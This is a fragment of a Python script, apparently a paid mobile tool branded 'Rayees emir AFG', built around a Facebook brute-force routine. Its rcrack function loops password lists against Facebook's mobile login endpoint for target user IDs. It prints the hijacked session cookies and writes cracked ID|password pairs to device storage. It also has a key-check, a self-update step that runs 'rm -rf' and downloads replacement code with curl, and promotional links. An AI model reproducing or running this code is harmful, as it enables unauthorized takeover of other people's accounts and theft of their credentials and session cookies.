...
def JOYA_apv():
    ...
    try:
        ...
        os.system('am start https://wa.me/+93774748047?text=' +tks+key1)

        

    r1=requests.get("https://github.com/Rayeesemir/AFG/blob/main/Key.txt").text
    ...
    if key1 in r1:
       ...
       JOYA() 
        ...
        print ("     \033[1;94mHello, welcome 💖 to Rayees emir AFG 🤞these commands are paid")
        print ("        7 days 80 Afghani")
        print ("        15 days 150 Afghani")
        print ("        30 days 300 Afghani")
           
        print ("    \033[1;32mRayees emir KEY : "+ak+key1) 
...
\033[1;31m====================================================
 ...
 |  __ \                                           (_)          /\   |  ____/ ____|
 | |__) |__ _ _   _  ___  ___  ___    ___ _ __ ___  _ _ __     /  \  | |__ | |  __ 
 |  _  // _` | | | |/ _ \/ _ \/ __|  / _ \ '_ ` _ \| | '__|   / /\ \ |  __|| | |_ |
 | | \ \ (_| | |_| |  __/  __/\__ \ |  __/ | | | | | | |     / ____ \| |   | |__| |
 |_|  \_\__,_|\__, |\___|\___||___/  \___|_| |_| |_|_|_|    /_/    \_\_|    \_____|
               __/ |                                                               
              |___/                                                                

\033[1;31m====================================================
\033[1;31m\033[1;37m \033[1;32mAUTHER     \033[1;31m➟   \033[1;32mRayees emir       \033[1;31m               ❘
\033[1;31m\033[1;37m \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32mMuhammad Lsmail Bigzadah       \033[1;31m              ❘
\033[1;31m\033[1;37m \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m Rayees emir                 \033[1;31m    ❘
\033[1;31m\033[1;37m \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32mRayees emir 420                 \033[1;31m    ❘
\033[1;31m\033[1;37m \033[1;32mWHATSAPP \33[1;31m ➟  \033[1;32m	+93774748047\033[1;31m		           ❘
\033[1;31m\033[1;37m \033[1;32mVERSION   \033[1;31m ➟   \033[1;32m15.1                          \033[1;31m      ❘  
\033[1;31m====================================================
 
       \33[37;41m\t WELLCOME TO Rayees emir TOOLS\33[0;m
 
\033[1;33m================== \33[32;33mAFG\33[1;33m ======================\n""")
def lines():
	print('\33[1;37m----------------------------------------------')
...
try:
    ...
    proxy = requests.get('https://github.com/AryanHack907/Free').text.splitlines()
    v = 1.9
    update = requests.get('https://github.com/AryanHack907/New-JKing/blob/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://github.com/AryanHack907/Free > JRun.py')
...
def JOYA():
	...
	os.system('xdg-open fb://group/1408056413159804?ref=share&mibextid=NSMWBT')
	print('[3] Follow me on Facebook')
	print('\x1b[1;91m[5] Exit Main menu')
	print('\33[1;37m----------------------------------------------')
	JOYA1 = input('[•] Select option  : ')
	if JOYA1 =='1':
		annu()
	if JOYA1 =='5':
		JOYA()
	if JOYA1 =='4':
		os.system('xdg-open http://wa.me/+93774748047?text=Rayees.Emir💜🐰Sir😪💕')
	if JOYA1 =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100087376664318&mibextid=ZbWKwL');JOYA()
	else:
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            free_fb = session.get('https://p.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100').text
            log_data = {
            ...
            'user-agent': pro}
            lo = session.post('https://p.alpha.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[R-AFG →🥀🥰 OK] '+cid+'|'+ps+'\033[0;97m')
                print(f'    \033[38;5;46m[COOKIE🍪] \033[38;5;192m'+coki)        
                open('/sdcard/R-AFG-Ok.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[R-AFG→💔🥺CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('/storage/emulated/0/cd /RaYeEs-AFG.py.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mRayeesAFG\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
